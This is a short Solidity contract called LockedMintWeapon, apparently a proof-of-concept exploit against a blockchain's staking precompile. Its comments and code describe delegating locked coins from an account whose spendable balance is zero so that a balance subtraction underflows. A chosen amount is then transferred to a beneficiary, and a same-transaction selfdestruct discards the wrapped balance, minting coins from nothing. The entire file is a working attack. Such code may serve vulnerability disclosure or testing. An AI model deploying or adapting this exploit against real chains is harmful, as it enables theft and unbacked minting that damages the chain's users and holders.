// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// CREATE2'd by LockedMintDeployer onto an address pre-created as a
// permanent-locked account, so `this` holds delegatable locked coins while its
// spendable StateDB balance is 0. Deploy and attack run in one tx so the
// trailing selfdestruct meets EIP-6780 and, finding code (DeleteAccount needs
// IsContract), discards the ~2**256 wrap, leaving only `mintAmt` to reconcile.
contract LockedMintWeapon {
    address constant precompile = 0x0000000000000000000000000000000000000800;

    receive() external payable {}

    function attack(
        string calldata validatorAddr,
        uint256 delegateAmt,
        address payable beneficiary,
        uint256 mintAmt
    ) external {
        // delegate locked coins: SubBalance on the spendable(=0) view underflows
        (bool ok, bytes memory data) = precompile.call(
            abi.encodeWithSignature(
                "delegate(address,string,uint256)",
                address(this),
                validatorAddr,
                delegateAmt
            )
        );
        require(ok && abi.decode(data, (bool)), "delegate failed");

        // move a finite amount out -> mints mintAmt to beneficiary at commit
        (bool sent, ) = beneficiary.call{value: mintAmt}("");
        require(sent, "mint transfer failed");

        // same-tx contract with code: selfdestruct deletes the huge balance
        selfdestruct(payable(address(this)));
    }
}
